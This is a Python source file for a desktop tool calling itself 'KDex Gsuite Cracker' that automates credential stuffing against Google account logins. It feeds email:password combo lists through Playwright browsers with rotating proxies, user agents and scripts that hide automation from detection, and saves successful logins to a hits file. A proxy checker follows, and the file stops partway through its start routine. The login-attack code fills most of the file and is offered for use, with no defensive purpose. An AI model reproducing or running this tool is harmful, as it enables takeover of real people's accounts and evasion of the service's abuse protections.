#!/usr/bin/env python3
# KzGeekChecker Professional v4.0 - Universal Edition
# All Browsers + Proxy Checker with Dark/Light Mode Toggle

import sys
import os
import time
import random
import threading
import queue
import requests
import signal
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Optional, TextIO
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                            QTabWidget, QGroupBox, QPushButton, QLineEdit, QLabel, 
                            QSpinBox, QComboBox, QCheckBox, QProgressBar, QTextEdit, 
                            QGridLayout, QFileDialog, QMessageBox)
from PyQt5.QtGui import QTextCursor
from PyQt5.QtCore import pyqtSignal, QTimer
from PyQt5.QtGui import QFont
from playwright.sync_api import sync_playwright


# Configuration
PROXY_FILE = "proxies.txt"
DEFAULT_WORKERS = 4
MAX_WORKERS_AGGRESSIVE = 8
MAX_WORKERS_SAFE = 20

# Browser Path Configuration (modify these according to your system)
BROWSER_PATHS = {
    'chrome': {
        'windows': r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        'linux': "/usr/bin/google-chrome",
        'darwin': "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    },
    'firefox': {
        'windows': r"C:\Program Files\Mozilla Firefox\firefox.exe",
        'linux': "/usr/bin/firefox",
        'darwin': "/Applications/Firefox.app/Contents/MacOS/firefox"
    },
    'firefox-nightly': {
        'windows': r"C:\Program Files\Firefox Nightly\firefox.exe",
        'linux': "/usr/bin/firefox-nightly",
        'darwin': "/Applications/Firefox Nightly.app/Contents/MacOS/firefox"
    },
    'brave': {
        'windows': r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        'linux': "/usr/bin/brave-browser",
        'darwin': "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser"
    },
    'edge': {
        'windows': r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        'linux': "/usr/bin/microsoft-edge",
        'darwin': "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"
    }
}

# Console Messages Configuration
CONSOLE_MESSAGES = {
    'welcome': "🎉 Welcome to KDex Gsuite Cracker! Let's the cracking begin",
    'starting': " Starting the checking process...",
    'loading_combos': "📚 Loading your combos...",
    'loading_proxies': "🔒 Loading proxy list...",
    'success': "✅ Hit found!",
    'error': "❌ Error occurred",
    'warning': "⚠️ Warning",
    'info': "ℹ️ Info",
    'completed': "🎉✨ All done! Hope you found some treasures! 💎 Ready for the next adventure? Let's go! 🚀",
    'pausing': "⏸️ Pausing...",
    'paused': "⏸️ Now Paused.",
    'resumed': "▶️ Resumed checking",
    'stopping': "⏹️ Stopping...",
    'stopped': "⏹️ Stopped checking."
}

class BrowserChecker:
    def __init__(self, browser_type, gui=None):
        self.browser_type = browser_type
        self.combos = []
        self.combo_file = None
        self.proxies = []
        self.workers = DEFAULT_WORKERS
        self.running = False
        self.paused = False
        self.use_proxies = False
        self.aggressive_mode = False
        self.headless_mode = True
        self.stealth_mode = False
        self.network_fails = []
        self.checked_count = 0
        self.total_count = 0
        self.hits = 0
        self.start_time = 0.0
        self.gui = gui
        self.current_index = 0
        self.memory_file = f"{browser_type.lower()}_memory.txt"
        self.hit_file = f"hits_{browser_type.lower()}.txt"
        self.browser_path_override = None
        self.browser_path = None
        self.mode_config = {
            'safe': {
                'timeout': 30000,
                'email_delay': (0.5, 1.5),
                'password_delay': (0.5, 1.5),
            },
            'aggressive': {
                'timeout': 15000,
                'email_delay': (0.1, 0.5),
                'password_delay': (0.1, 0.5),
            }
        }
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
        ]
        self.viewports = [
            {'width': 1920, 'height': 1080},
            {'width': 1366, 'height': 768},
            {'width': 1440, 'height': 900},
            {'width': 1536, 'height': 864},
            {'width': 1600, 'height': 900},
            {'width': 1280, 'height': 720}
        ]

    def load_combos(self, path, resume=False):
        try:
            self.combo_file = path
            self.log(f"[⏳] Loading combos from: {os.path.basename(path)}...", 'cyan')
            
            # Get file size for large file handling
            file_size = os.path.getsize(path)
            file_size_mb = file_size / (1024 * 1024)
            self.log(f"[📊] File size: {file_size_mb:.2f} MB", 'cyan')
            
            # For large files, we'll count lines and sample the first few combos
            # without loading everything into memory
            self.combos = []
            sample_combos = []
            line_count = 0
            
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                # Read first few lines for preview
                for i, line in enumerate(f):
                    line = line.strip()
                    if ':' in line:
                        if i < 3:  # Store first 3 valid combos for preview
                            sample_combos.append(line.split(':', 1))
                        line_count += 1
                    
                    # For very large files, stop counting after a threshold and estimate
                    if file_size > 100 * 1024 * 1024 and i >= 10000:  # 100MB+ files
                        # Estimate total lines based on first 10000 lines
                        avg_line_size = file_size / (i + 1)
                        estimated_lines = int(file_size / avg_line_size)
                        self.log(f"[📊] Large file detected. Estimating ~{estimated_lines:,} combos", 'cyan')
                        line_count = estimated_lines
                        break

            # If we didn't break early due to large file, use the actual count
            if file_size <= 100 * 1024 * 1024:
                self.log(f"[📊] Counted {line_count:,} combos", 'cyan')
            
            if line_count == 0:
                self.log("[!] No valid combos found", 'orange')
                return False

            # Store file info but not all combos in memory
            self.total_count = line_count
            self.current_index = 0
            self.checked_count = 0
            self.file_size = file_size
            self.chunk_size = 1000  # Process in chunks of 1000 combos
            self.current_chunk = []
            self.current_chunk_start = 0
            
            if resume and os.path.exists(self.memory_file):
                try:
                    with open(self.memory_file, 'r') as f:
                        data = f.read().strip().split('\n')
                        if len(data) >= 3 and data[0] == path:
                            self.current_index = int(data[1])
                            self.checked_count = int(data[2])
                            if 0 <= self.current_index < self.total_count:
                                self.log(f"[+] Resuming from combo #{self.current_index + 1}", 'green')
                            else:
                                self.current_index = 0
                                self.checked_count = 0
                except Exception as e:
                    self.log(f"[!] Error reading memory: {str(e)}", 'red')
            
            self.hits = 0
            self.log(f"[✓] Successfully prepared {self.total_count:,} combos from {os.path.basename(path)}", 'green')
            
            # Show combo preview
            if sample_combos:
                self.log("--- Combo Preview ---", 'cyan')
                for email, password in sample_combos:
                    self.log(f"{email}:{password[:3]}...", 'white')
                self.log("---------------------", 'cyan')

            return True
            
        except Exception as e:
            self.log(f"[!] Error loading combos: {str(e)}", 'red')
            return False
            
    def get_combo_chunk(self, start_index, chunk_size):
        """Load a chunk of combos from the file starting at start_index"""
        if not self.combo_file or not os.path.exists(self.combo_file):
            return []
            
        combos = []
        try:
            with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                # Skip to the start index
                for _ in range(start_index):
                    next(f, None)
                
                # Read the chunk
                for _ in range(chunk_size):
                    line = next(f, None)
                    if line is None:
                        break
                    line = line.strip()
                    if ':' in line:
                        combos.append(line.split(':', 1))
        except Exception as e:
            self.log(f"[!] Error reading combo chunk: {str(e)}", 'red')
            
        return combos

    def load_proxies(self):
        if not os.path.exists(PROXY_FILE):
            self.log(f"[!] Proxy file not found: {PROXY_FILE}", 'orange')
            return False
            
        try:
            with open(PROXY_FILE, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
            if not self.proxies:
                self.log("[!] No proxies found", 'orange')
                return False
                
            self.log(f"[+] Loaded {len(self.proxies)} proxies", 'green')
            return True
            
        except Exception as e:
            self.log(f"[!] Error loading proxies: {str(e)}", 'red')
            return False

    def parse_proxy(self, proxy_str):
        if not proxy_str:
            return None
            
        parts = proxy_str.split(':')
        try:
            if len(parts) == 2:
                return {"server": f"http://{parts[0]}:{parts[1]}"}
            elif len(parts) == 4:
                return {
                    "server": f"http://{parts[0]}:{parts[1]}",
                    "username": parts[2],
                    "password": parts[3]
                }
        except:
            pass
            
        self.log(f"[!] Invalid proxy format: {proxy_str}", 'orange')
        return None

    def save_hit(self, email, password):
        try:
            with open(self.hit_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
                f.flush()  # Ensure immediate write to disk
                os.fsync(f.fileno())  # Force OS to write to disk
        except Exception as e:
            self.log(f"[!] Error saving hit: {str(e)}", 'red')

    def log(self, message, color='white'):
        if self.gui:
            self.gui.log_signal.emit(self.browser_type, message, color)

    def save_memory(self):
        try:
            if self.combo_file:
                with open(self.memory_file, 'w') as f:
                    f.write(f"{self.combo_file}\n{self.checked_count}\n{self.checked_count}")
                    f.flush()  # Ensure immediate write to disk
                    os.fsync(f.fileno())  # Force OS to write to disk
        except Exception as e:
            self.log(f"[!] Error saving memory: {str(e)}", 'red')
    
    def clear_memory(self):
        try:
            if os.path.exists(self.memory_file):
                os.remove(self.memory_file)
        except:
            pass

    def human_type(self, page, selector, text):
        """Simulate human typing with random delays between characters"""
        if self.stealth_mode:
            # Enhanced human-like typing for stealth mode
            for i, char in enumerate(text):
                # Occasional longer pauses (thinking)
                if i > 0 and random.random() < 0.1:
                    time.sleep(random.uniform(0.3, 0.8))
                
                # Vary typing speed based on character
                if char in '@.':
                    delay = random.uniform(100, 250)  # Slower for special chars
                else:
                    delay = random.uniform(80, 180)
                
                page.type(selector, char, delay=delay)
                time.sleep(random.uniform(0.08, 0.25))
        else:
            # Standard typing
            for char in text:
                page.type(selector, char, delay=random.uniform(50, 150))
                time.sleep(random.uniform(0.05, 0.15))

    def is_element_visible(self, page, selector, timeout=10000):
        """Check if element is visible with timeout handling"""
        try:
            element = page.locator(selector).first
            element.wait_for(state="visible", timeout=timeout)
            return True
        except:
            return False
    
    def update_progress(self):
        self.checked_count += 1
        self.current_index += 1
        
        if self.checked_count % 10 == 0:
            self.save_memory()
        
        if self.gui:
            self.gui.update_stats_signal.emit(self.browser_type)

    def get_browser_path(self):
        paths = {
            'chrome': [
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
            ],
            'firefox': [
                r"C:\Program Files\Mozilla Firefox\firefox.exe",
                r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
            ],
            'firefox-nightly': [
                os.path.join(os.getcwd(), "Firefox-nightly", "firefox.exe"),
                r"C:\Program Files\Firefox Nightly\firefox.exe",
            ],
            'brave': [
                r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe"
            ],
            'edge': [
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
            ]
        }
        
        for path in paths.get(self.browser_type, []):
            if os.path.exists(path):
                return path
        return None

    def attempt_login(self, index, combo, proxy_config=None):
        while self.paused and self.running:
            time.sleep(0.5)

        if self.running is False:
            return
            
        email, password = combo
        mode = 'aggressive' if self.aggressive_mode else 'safe'
        config = self.mode_config[mode]

        try:
            with sync_playwright() as p:
                # Enhanced delay system for multiple workers
                base_delay = random.uniform(1, 3)
                worker_delay = (index % 10) * 0.5  # Stagger workers
                time.sleep(base_delay + worker_delay)
                
                if self.browser_type in ['firefox', 'firefox-nightly']:
                    # Reduced Firefox anti-detection launch args
                    firefox_args = []
                    if self.stealth_mode:
                        firefox_args.extend([
                            '--no-default-browser-check',
                            '--no-first-run'
                        ])
                    
                    browser = p.firefox.launch(
                        headless=self.headless_mode,
                        proxy=proxy_config if (proxy_config and self.use_proxies) else None,
                        slow_mo=30 if not self.stealth_mode else 80,
                        args=firefox_args
                    )
                    
                    # Firefox user agent rotation
                    firefox_agents = [
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
                        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/118.0',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/118.0'
                    ]
                    selected_firefox_agent = firefox_agents[index % len(firefox_agents)]
                    
                    viewport = random.choice(self.viewports)
                    context = browser.new_context(
                        user_agent=selected_firefox_agent,
                        viewport={'width': viewport['width'], 'height': viewport['height']},
                        java_script_enabled=True,
                        accept_downloads=False,
                        bypass_csp=True,
                        ignore_https_errors=True
                    )
                else:
                    # More stealthy browser launch for Chromium-based browsers
                    user_agent_index = index % len(self.user_agents)
                    selected_user_agent = self.user_agents[user_agent_index]
                    
                    browser = p.chromium.launch(
                        headless=self.headless_mode,
                        proxy=proxy_config if (proxy_config and self.use_proxies) else None,
                        args=[
                            '--start-maximized',
                            '--disable-blink-features=AutomationControlled',
                            '--disable-infobars',
                            '--no-sandbox',
                            '--disable-setuid-sandbox',
                            '--disable-dev-shm-usage',
                            '--incognito',
                            f'--user-agent={selected_user_agent}'
                        ]
                    )
                    
                    viewport = random.choice(self.viewports)
                    context = browser.new_context(
                        user_agent=selected_user_agent,
                        viewport={'width': viewport['width'], 'height': viewport['height']},
                        java_script_enabled=True,
                        storage_state=None,  # Ensures no persistent storage
                        bypass_csp=True
                    )
                    
                    # Grant permissions to avoid suspicious behavior
                    context.clear_cookies()
                    context.grant_permissions(['geolocation', 'notifications'])
                
                page = context.new_page()
                
                # Enhanced anti-detection for both Firefox and Chromium
                if self.stealth_mode:
                    if self.browser_type in ['firefox', 'firefox-nightly']:
                        # Reduced Firefox stealth (less aggressive)
                        page.add_init_script("""
                            // Basic webdriver removal
                            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                            
                            // Basic properties
                            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
                            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                        """)
                    else:
                        # Chromium stealth (existing code)
                        page.add_init_script("""
                            delete Object.getPrototypeOf(navigator).webdriver;
                            window.navigator.chrome = { runtime: {} };
                            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                            
                            const getParameter = WebGLRenderingContext.getParameter;
                            WebGLRenderingContext.prototype.getParameter = function(parameter) {
                                if (parameter === 37445) return 'Intel Inc.';
                                if (parameter === 37446) return 'Intel(R) Iris(TM) Graphics 6100';
                                return getParameter(parameter);
                            };
                            
                            setInterval(() => {
                                const event = new MouseEvent('mousemove', {
                                    clientX: Math.random() * window.innerWidth,
                                    clientY: Math.random() * window.innerHeight
                                });
                                document.dispatchEvent(event);
                            }, Math.random() * 10000 + 5000);
                        """)
                else:
                    # Enhanced regular mode anti-detection (for 10+ workers)
                    if self.browser_type in ['firefox', 'firefox-nightly']:
                        # Firefox regular mode - minimal detection
                        page.add_init_script("""
                            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2] });
                        """)
                    else:
                        # Chromium regular mode
                        page.add_init_script("""
                            delete Object.getPrototypeOf(navigator).webdriver;
                            Object.defineProperty(navigator, 'webdriver', { get: () => false });
                            
                            if (navigator.userAgent.includes('Chrome')) {
                                window.navigator.chrome = { runtime: {} };
                            }
                            
                            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
                            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                        """)
                
                try:
                    # Stealth mode: Add random pre-navigation delay
                    if self.stealth_mode:
                        page.wait_for_timeout(random.uniform(2000, 5000))
                        # Simulate human-like tab switching
                        page.evaluate("() => { window.blur(); window.focus(); }")
                    
                    # Randomize navigation timing
                    page.goto("https://accounts.google.com/", timeout=config['timeout'], wait_until='domcontentloaded')
                    page.wait_for_timeout(random.uniform(1000, 3000))
                    
                    # Stealth mode: Simulate human reading time
                    if self.stealth_mode:
                        page.wait_for_timeout(random.uniform(1500, 4000))
                        # Random scroll to simulate human behavior
                        page.evaluate("window.scrollTo(0, Math.random() * 100)")
                    
                    # Check if we're being blocked
                    if "sorry" in page.url.lower() or "blocked" in page.url.lower():
                        self.log(f"[×] BLOCKED: {email}\n", 'red')
                        self.update_progress()
                        return

                    # Email step with more human-like interaction
                    if self.stealth_mode:
                        # Stealth: Click on email field first, then wait
                        page.click('input[type="email"]')
                        page.wait_for_timeout(random.uniform(800, 1500))
                    
                    self.human_type(page, 'input[type="email"]', email)
                    
                    if self.stealth_mode:
                        # Stealth: Simulate user thinking/reviewing
                        page.wait_for_timeout(random.uniform(1000, 2500))
                        # Random mouse movement over the button
                        page.hover('#identifierNext')
                        page.wait_for_timeout(random.uniform(200, 800))
                    
                    page.wait_for_timeout(random.uniform(500, 1500))
                    page.click('#identifierNext')
                    page.wait_for_timeout(random.uniform(2000, 4000))

                    # Password step with more robust checking
                    try:
                        if self.is_element_visible(page, 'input[type="password"]', 10000):
                            if self.stealth_mode:
                                # Stealth: Click password field and wait
                                page.click('input[type="password"]')
                                page.wait_for_timeout(random.uniform(600, 1200))
                            
                            self.human_type(page, 'input[type="password"]', password)
                            
                            if self.stealth_mode:
                                # Stealth: Simulate password review
                                page.wait_for_timeout(random.uniform(800, 2000))
                                page.hover('#passwordNext')
                                page.wait_for_timeout(random.uniform(300, 900))
                            
                            page.wait_for_timeout(random.uniform(500, 1500))
                            page.click('#passwordNext')
                            page.wait_for_timeout(random.uniform(3000, 6000))

                            # Wait longer and check multiple success indicators
                            page.wait_for_timeout(random.uniform(3000, 5000))
                            
                            if "myaccount.google.com" in page.url or "accounts.google.com/ManageAccount" in page.url or "mail.google.com" in page.url or page.locator('a[data-pid="23"]').count() > 0:
                                self.hits += 1
                                self.log(f"[✓] Valid Login Found: {email}:{password}\n", 'green')
                                self.save_hit(email, password)
                            elif "challenge" in page.url or "captcha" in page.url.lower():
                                self.log(f"[−] Wrong Password: {email}\n", 'white')
                            else:
                                self.log(f"[−] Wrong Password: {email}\n", 'white')
                        else:
                            error_locator = page.locator('div[jsname="B34EJ"]').first
                            if error_locator and error_locator.is_visible():
                                error_msg = error_locator.inner_text().strip()
                                self.log(f"[×] Account Blocked or Captcha: {email} — {error_msg}\n", 'red')
                            else:
                                self.log(f"[×] Account Blocked or Captcha: {email}\n", 'red')
                    except Exception as e:
                        self.log(f"[×] Password step error for {email}: {str(e)[:80]}\n", 'red')

                except Exception as e:
                    self.log(f"[×] Navigation error for {email}: {str(e)[:80]}\n", 'red')
                finally:
                    context.close()
                    browser.close()

        except Exception as e:
            self.log(f"[×] Unexpected error for {email}: {str(e)[:80]}\n", 'red')
        finally:
            self.update_progress()

    def start(self, combo_file, workers, use_proxies, aggressive_mode, headless_mode, stealth_mode, resume, recheck_fails):
        self.combo_file = combo_file
        self.workers = workers
        self.use_proxies = use_proxies
        self.aggressive_mode = aggressive_mode
        self.headless_mode = headless_mode
        self.stealth_mode = stealth_mode
        self.recheck_fails = recheck_fails
        self.network_fails = []
        
        if not self.load_combos(combo_file, resume):
            return False
            
        if use_proxies:
            self.load_proxies()

        self.browser_path = self.get_browser_path()
        if self.browser_path_override and os.path.exists(self.browser_path_override):
            self.browser_path = self.browser_path_override

        browser_name = self.browser_type.title()

        if self.browser_path:
            self.log(f"[+] System {browser_name} found: {self.browser_path}", 'green')
        else:
            self.log(f"[!] System {browser_name} not found. Please check path.", 'red')
            return False

        mode = "AGGRESSIVE" if self.aggressive_mode else "SAFE"
        self.log(f"🚀 Starting {browser_name} {mode} mode with {workers} workers", 'cyan')
        self.log(f"[•] {browser_name} Path: {self.browser_path or 'Default'}", 'white')
        self.log(f"[•] Headless: {'ON' if self.headless_mode else 'OFF'}", 'white')
        self.log(f"[•] Stealth: {'ON' if self.stealth_mode else 'OFF'} {'(Enhanced Anti-Detection)' if self.stealth_mode else ''}", 'white')
        self.log(f"[•] Proxies: {'Enabled' if self.use_proxies else 'Disabled'}", 'white')
        self.log(f"[•] Total Combos: {self.total_count:,} (Starting from #{self.current_index + 1})", 'white')
        self.log(f"[•] Remaining: {self.total_count - self.current_index:,} combos to process", 'white')
        self.log(f"[•] Press Stop button to cancel", 'white')
            
        self.running = True
        self.paused = False
        self.start_time = time.time()
        
        # Process in chunks to handle large files
        with ThreadPoolExecutor(max_workers=workers) as executor:
            from itertools import cycle
            proxy_cycle = cycle(self.proxies) if self.proxies else cycle([None])
            
            current_index = self.current_index
            futures = []
            
            while current_index < self.total_count and self.running:
                # Load a chunk of combos
                chunk_size = min(self.chunk_size, self.total_count - current_index)
                chunk = self.get_combo_chunk(current_index, chunk_size)
                
                if not chunk:
                    self.log(f"[!] Failed to load chunk at index {current_index}", 'red')
                    break
                
                # Process the chunk
                for i, combo in enumerate(chunk):
                    if not self.running:
                        break
                        
                    while self.paused and self.running:
                        time.sleep(0.5)
                        
                    absolute_index = current_index + i
                    proxy = next(proxy_cycle) if use_proxies else None
                    proxy_config = self.parse_proxy(proxy) if proxy else None
                    
                    future = executor.submit(self.attempt_login, absolute_index, combo, proxy_config)
                    futures.append(future)
                
                # Move to next chunk
                current_index += len(chunk)
                
                # Small delay between chunks to prevent overwhelming the system
                time.sleep(0.1)
            
            # Wait for all workers to complete if stopping
            if not self.running and futures:
                self.log(f"[⏹] Stopping workers... waiting for {len([f for f in futures if not f.done()])} active workers to finish", 'yellow')
                for future in futures:
                    try:
                        future.result(timeout=30)  # Wait up to 30 seconds per worker
                    except:
                        pass
                self.log(f"[✓] All workers stopped", 'green')

        if self.recheck_fails and self.network_fails:
            self.log(f"--- Rechecking {len(self.network_fails)} combos that failed due to network issues ---", 'cyan')
            recheck_combos = self.network_fails.copy()
            self.network_fails.clear()
            
            with ThreadPoolExecutor(max_workers=workers) as executor:
                proxy_cycle = cycle(self.proxies) if self.proxies else cycle([None])
                
                for original_index, combo in recheck_combos:
                    if not self.running:
                        break
                    
                    while self.paused and self.running:
                        time.sleep(0.5)
                        
                    proxy = next(proxy_cycle) if use_proxies else None
                    proxy_config = self.parse_proxy(proxy) if proxy else None
                    
                    executor.submit(self.attempt_login, original_index, combo, proxy_config)
        
        # Add detailed completion message
        elapsed_time = time.time() - self.start_time
        hours, remainder = divmod(elapsed_time, 3600)
        minutes, seconds = divmod(remainder, 60)
        time_str = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
        
        self.log("\n" + "="*60, 'green')
        if self.running:
            self.log(f"🎉 {browser_name} checking completed successfully!", 'green')
        else:
            self.log(f"⚠️ {browser_name} checking stopped by user", 'yellow')
        
        self.log(f"📊 Final Statistics:", 'cyan')
        self.log(f"   ✅ Processed: {self.checked_count:,}/{self.total_count:,} combos", 'white')
        self.log(f"   🎯 Valid Hits: {self.hits:,} (saved to {self.hit_file})", 'green' if self.hits > 0 else 'white')
        
        if self.checked_count > 0:
            hit_rate = (self.hits / self.checked_count) * 100
            avg_speed = (self.checked_count / elapsed_time) * 60 if elapsed_time > 0 else 0
            self.log(f"   📈 Hit Rate: {hit_rate:.2f}%", 'green' if hit_rate > 0 else 'white')
            self.log(f"   ⚡ Average Speed: {avg_speed:.1f} combos/min", 'white')
        
        self.log(f"   ⏱️ Total Time: {time_str}", 'white')
        self.log(f"   📅 Completed: {time.strftime('%Y-%m-%d %H:%M:%S')}", 'white')
        
        if self.running and self.checked_count == self.total_count:
            self.clear_memory()
            self.log(f"   🧹 Memory cleared (session completed)", 'green')
        else:
            self.save_memory()
            self.log(f"   💾 Progress saved (can resume later)", 'yellow')
        
        self.log("="*60 + "\n", 'green')
        self.log("🚀 Ready for next session! Load a new combo file to continue.", 'cyan')

        return True

    def stop(self):
        self.running = False
        self.paused = False
        # Reset state to allow restart
        self.start_time = 0.0

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False





class ProxyChecker:
    def __init__(self, gui=None):
        self.proxies = []
        self.proxy_file = None
        self.workers = DEFAULT_WORKERS
        self.running = False
        self.paused = False
        self.checked_count = 0
        self.total_count = 0
        self.working_proxies = 0
        self.start_time = 0.0
        self.gui = gui
        self.working_file = "working_proxies.txt"
        self.timeout = 10
        self.test_url = "http://httpbin.org/ip"
        self.chunk_size = 1000  # Process in chunks of 1000 proxies

    def load_proxies(self, path):
        try:
            self.proxy_file = path
            self.log(f"📂 Loading proxy file: {os.path.basename(path)}", 'cyan')
            
            # Get file size for large file handling
            file_size = os.path.getsize(path)
            file_size_mb = file_size / (1024 * 1024)
            self.log(f"[📊] File size: {file_size_mb:.2f} MB", 'cyan')
            
            # For large files, count lines without loading everything
            if file_size > 100 * 1024 * 1024:  # 100MB+
                line_count = 0
                sample_size = 10000
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    for i, line in enumerate(f):
                        if i >= sample_size:
                            break
                        if line.strip() and not line.startswith('#'):
                            line_count += 1
                
                # Estimate total based on sample
                avg_line_size = file_size / sample_size
                estimated_total = int(file_size / avg_line_size * (line_count / sample_size))
                self.total_count = estimated_total
                self.log(f"[📊] Large file detected. Estimating ~{estimated_total:,} proxies", 'cyan')
                
                # We'll process in chunks during checking
                self.proxies = []  # Will be populated during processing
            else:
                # For smaller files, load normally
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    all_proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                if not all_proxies:
                    self.log("❌ No valid proxy servers found in file!", 'red')
                    return False
                
                self.proxies = all_proxies
                self.total_count = len(all_proxies)
            
            self.working_proxies = 0
            self.checked_count = 0
            
            self.log(f"✅ Successfully prepared {self.total_count:,} proxy servers", 'green')
            self.log(f"🎯 Ready to test {self.total_count:,} proxies for connectivity", 'cyan')
            return True
            
        except Exception as e:
            self.log(f"❌ Failed to load proxy file: {str(e)}", 'red')
            return False
            
    def get_proxy_chunk(self, start_index, chunk_size):
        """Load a chunk of proxies from the file starting at start_index"""
        if not self.proxy_file or not os.path.exists(self.proxy_file):
            return []
            
        proxies = []
        try:
            with open(self.proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                # Skip to the start index
                for _ in range(start_index):
                    next(f, None)
                
                # Read the chunk
                for _ in range(chunk_size):
                    line = next(f, None)
                    if line is None:
                        break
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
        except Exception as e:
            self.log(f"[!] Error reading proxy chunk: {str(e)}", 'red')
            
        return proxies

    def save_working_proxy(self, proxy):
        try:
            with open(self.working_file, 'a', encoding='utf-8') as f:
                f.write(f"{proxy}\n")
                f.flush()  # Ensure immediate write to disk
                os.fsync(f.fileno())  # Force OS to write to disk
        except Exception as e:
            self.log(f"[!] Error saving working proxy: {str(e)}", 'red')

    def log(self, message, color='white'):
        if self.gui:
            self.gui.log_signal.emit('proxy', message, color)

    def update_progress(self):
        self.checked_count += 1
        
        if self.gui:
            self.gui.update_stats_signal.emit('proxy')

    def test_proxy(self, proxy):
        if not self.running:
            return
            
        try:
            if ':' not in proxy:
                self.log(f"[!] Invalid proxy format: {proxy}", 'orange')
                self.update_progress()
                return
                
            parts = proxy.split(':')
            if len(parts) == 2:
                proxy_dict = {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                }
            elif len(parts) == 4:
                proxy_dict = {
                    'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                    'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                }
            else:
                self.log(f"[!] Invalid proxy format: {proxy}", 'orange')
                self.update_progress()
                return
            
            response = requests.get(
                self.test_url,
                proxies=proxy_dict,
                timeout=self.timeout,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code == 200:
                self.working_proxies += 1
                self.log(f"[✓] Working Proxy: {proxy}", 'green')
                self.save_working_proxy(proxy)
            else:
                self.log(f"[×] Dead Proxy: {proxy} (Status: {response.status_code})", 'red')
                
        except requests.exceptions.Timeout:
            self.log(f"[×] Timeout: {proxy}", 'red')
        except requests.exceptions.ConnectionError:
            self.log(f"[×] Connection Error: {proxy}", 'red')
        except Exception as e:
            self.log(f"[×] Error: {proxy} - {str(e)[:50]}", 'red')
        finally:
            self.update_progress()

    def start(self, proxy_file, workers, timeout, test_url):
        # Welcome message
        self.log("="*60, 'cyan')
        self.log(f" Welcome to KDex Gsuite Cracker v4.0 - Proxy Checker!", 'green')
